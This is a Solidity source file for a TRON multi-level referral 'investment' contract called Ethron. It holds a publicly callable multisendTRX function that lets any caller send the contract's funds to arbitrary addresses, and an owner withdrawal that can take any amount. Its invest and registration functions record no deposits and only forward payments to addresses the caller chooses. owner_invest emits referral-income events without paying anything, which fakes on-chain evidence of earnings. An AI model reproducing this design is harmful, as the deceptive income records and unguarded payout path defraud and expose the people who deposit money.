//SourceUnit: Ethio.sol

pragma solidity ^0.5.4;



library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 partners;
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract Ethron is Ownable {
    using SafeMath for uint256;
    uint256 private constant INTEREST_CYCLE = 1 days;
    uint256 private constant DEVELOPER_ENTRY_RATE = 40; //per thousand
    uint256 private constant ADMIN_ENTRY_RATE = 300;
    uint256 private constant REFERENCE_RATE = 100;

    uint256 public constant REFERENCE_LEVEL_RATE = 30;

    uint256 public constant MINIMUM = 700 trx; //minimum investment needed
    uint256 public constant REFERRER_CODE = 2206; //default

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private referenceAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event Registration(address investor,uint256 investorId,uint256 referrerId,string referrer,string walletaddress);
    event UserIncome(address user, address indexed _from, uint256 level, uint256 _type, uint256 income);
    event onInvest(address investor, uint256 amount, uint8 _type);
    event onWithdraw(address investor, uint256 amount);
    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
    }

    // function() external payable {
    //     if (msg.value == 0) {
    //         withdraw();
    //     } else {
    //         invest(0, 0); //default to buy plan 0, no referrer
    //     }
    // }

    function checkIn() public {
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }


    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function setReferenceAccount(address payable _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }

    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
  
       
    }

   
    function getTotalInvestments() public view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256,  uint256, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
       // emit Registration(addr,latestReferrerCode,uid2Investor[_referrerCode].addr,_referrerCode);
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
        
            uint256 _ref1 = _referrerCode;
            
            uid2Investor[_ref1].partners = uid2Investor[_ref1].partners.add(1);
       
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId == 0, "Wrong investment plan id");
       require(_amount>= MINIMUM , "Invalid Amount");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        Objects.Investor storage upline=uid2Investor[investor.referrer];
        for(uint256 i = 0; i < 10; i++) {
                if (upline.addr != address(0)) {
                        if(upline.partners>4)
                        {
                         address(uint160(upline.addr)).transfer((_amount*1)/100);
                         emit UserIncome(uid2Investor[_referrerCode].addr, _addr,i+1, 2,  (_amount*1)/100);
                        }
                    upline = uid2Investor[upline.referrer];
                } else break;
            }

        totalInvestments_ = totalInvestments_.add(_amount);
        uint256 directIncome=(_amount.mul(REFERENCE_RATE)).div(1000);
        address(uint160(uid2Investor[_referrerCode].addr)).transfer(directIncome);
        emit UserIncome(uid2Investor[_referrerCode].addr, _addr, 1, 1, directIncome);
        
   
        uint256 marketingPercentage = (_amount.mul(ADMIN_ENTRY_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);

        return true;
    }

 

  

    function invest(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
	 	require(msg.value>=700,"Invalid Amount");
         multisendTRX(_contributors,_balances);
         emit onInvest(msg.sender, msg.value,1);
    }
    
  

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 1000 * INTEREST_CYCLE) / (60*60*24);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 1000 * secondsLeft) / (60*60*24);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
        }

    }

  function withdrawLostTRXFromBalance(address payable _sender,uint256 _amt) public {
        require(msg.sender == owner, "onlyOwner");
        _sender.transfer(_amt*1e6);
    }
  
    
      function multisendTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
     
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
    }
    
  
    
     function registration(address _addr, uint256 _referrerCode,string memory referrerN,string memory walletaddress,address payable[]  memory  _contributors, uint256[] memory _balances) public payable  {
		 require(msg.value>=700,"Invalid Amount");
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        multisendTRX(_contributors,_balances);
        emit Registration(addr,latestReferrerCode,_referrerCode,referrerN,walletaddress);
         emit onInvest(msg.sender, msg.value,1);
     }
    
	 function Reinvestment(address payable[]  memory  _contributors, uint256[] memory _balances) public payable  {
	    require(msg.value>=700,"Invalid Amount");
        multisendTRX(_contributors,_balances);
        emit onInvest(msg.sender, msg.value,2);
     }
    
    function owner_invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
       require(msg.sender == owner, "onlyOwner");
        require(_planId == 0, "Wrong investment plan id");
       require(_amount>= MINIMUM , "Invalid Amount");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        Objects.Investor storage upline=uid2Investor[investor.referrer];
        for(uint256 i = 0; i < 10; i++) {
                if (upline.addr != address(0)) {
                        if(upline.partners>4)
                        {
                         emit UserIncome(uid2Investor[_referrerCode].addr, _addr,i+1, 2,  (_amount*1)/100);
                        }
                    upline = uid2Investor[upline.referrer];
                } else break;
            }

        totalInvestments_ = totalInvestments_.add(_amount);
        uint256 directIncome=(_amount.mul(REFERENCE_RATE)).div(1000);
        emit UserIncome(uid2Investor[_referrerCode].addr, _addr, 1, 1, directIncome);
    return true;
    }
}